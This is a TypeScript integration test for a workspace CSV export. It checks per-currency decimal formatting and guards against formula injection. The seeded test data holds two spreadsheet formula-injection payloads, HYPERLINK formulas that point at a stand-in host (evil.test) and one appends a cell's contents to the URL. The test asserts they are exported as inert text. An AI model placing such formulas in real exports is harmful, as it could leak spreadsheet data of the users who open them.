/** #962: the workspace CSV export guards formulas and writes each amount with its own currency's decimals. */
import { describe, it, before, after } from 'node:test';
import assert from 'node:assert/strict';
import crypto from 'node:crypto';
import type { Server } from 'node:http';
import { closeServer, listenOnRandomPort, restoreEnv, signTestJwt, useLiveApiEnv } from './helpers/liveApiServer';
import { parseCsv } from '../lib/csv';

const hasDb = Boolean(process.env.LF_TEST_DATABASE_URL);
describe('#962 workspace CSV export', { skip: !hasDb && 'needs LF_TEST_DATABASE_URL' }, () => {
  const tag = crypto.randomBytes(4).toString('hex');
  const wsId = `ws_962_${tag}`;
  const ownerUid = crypto.randomUUID();
  const email = `owner.962.${tag}@example.test`;
  let server: Server | undefined;
  let base = '';
  let prevEnv: Record<string, string | undefined> = {};
  let db: Awaited<ReturnType<(typeof import('../server/db/firestore'))['getDb']>>;

  before(async () => {
    prevEnv = useLiveApiEnv('csv-export-962');
    const [{ getDb }, { createApp }] = await Promise.all([import('../server/db/firestore'), import('../../server')]);
    db = getDb();
    await db.pool.query(`insert into auth.users (id, email, email_confirmed_at, raw_app_meta_data) values ($1::uuid, $2, now(), '{}'::jsonb)`, [ownerUid, email]);
    await db.collection('workspaces').doc(wsId).set({ id: wsId, name: '962', uid: ownerUid, members: [ownerUid], roles: { [ownerUid]: 'owner' }, plan: 'pro', bypassBilling: true, currency: 'USD', createdAt: new Date().toISOString() });
    const tx = (id: string, extra: Record<string, unknown>) => db.collection('transactions').doc(`${wsId}_${id}`).set({ id: `${wsId}_${id}`, workspaceId: wsId, date: '2026-11-18', type: 'actual', status: 'posted', ...extra, lines: [{ accountId: 'cash', amountCents: Number(extra.totalAmountCents) }, { accountId: 'sales', amountCents: -Number(extra.totalAmountCents) }] });
    await tx('usd', { description: ' =HYPERLINK("https://evil.test/x?d="&A1,"Open")', totalAmountCents: 1650000, currency: 'USD', reference: 'INV-1' });
    await tx('jpy', { description: 'Tokyo rent', totalAmountCents: 1000000, currency: 'JPY', reference: 'INV-2' });
    await tx('kwd', { description: 'Kuwait retainer', totalAmountCents: 12345, currency: 'KWD', reference: 'INV-3' });
    // J-10 (Agent #11): a formula-looking name/reference is text as well
    await tx('ref', { description: 'Ordinary sale', totalAmountCents: 500, currency: 'USD', reference: '=HYPERLINK("https://evil.test/collect")' });
    const app = await createApp();
    ({ server, base } = await listenOnRandomPort(app));
  });

  after(async () => {
    await closeServer(server);
    if (db) {
      await db.pool.query(`delete from public.transactions where workspace_id = $1`, [wsId]);
      await db.pool.query(`delete from public.workspaces where id = $1`, [wsId]);
      await db.pool.query(`delete from public.users where id = $1`, [ownerUid]);
      await db.pool.query(`delete from auth.users where id = $1::uuid`, [ownerUid]);
    }
    restoreEnv(prevEnv);
  });

  it('guards a formula-leading description and writes JPY, KWD and USD with their own decimals', async () => {
    const token = await signTestJwt({ uid: ownerUid, email, aal: 'aal2', userMetadata: { email_verified: true } });
    const res = await fetch(`${base}/api/v1/workspaces/${wsId}/export?format=csv`, { headers: { Authorization: `Bearer ${token}` } });
    assert.equal(res.status, 200);
    const csv = await res.text();
    assert.match(csv, /"1000000","Tokyo rent"/, 'yen has no decimals');
    assert.match(csv, /"12\.345","Kuwait retainer"/, 'dinar has three decimals');
    assert.match(csv, /"16500\.00"/, 'dollars keep two decimals');
    assert.doesNotMatch(csv, /"\s*=HYPERLINK/, 'the formula is not live');
    assert.match(csv, /"' =HYPERLINK/, 'the formula is written as text');
    assert.match(csv, /"'=HYPERLINK/, 'a formula-looking reference is written as text too');
    // J-10 (Agent #11): the yen row round-trips through the shared CSV reader exactly as stored
    const parsed = parseCsv(csv);
    const yen = parsed.find(r => r[2] === 'Tokyo rent');
    assert.ok(yen, 'the yen row is in the parsed CSV');
    assert.equal(yen[1], '1000000', 'JPY 1000000 minor units round-trip unchanged (0 decimals, no /100)');
  });
});
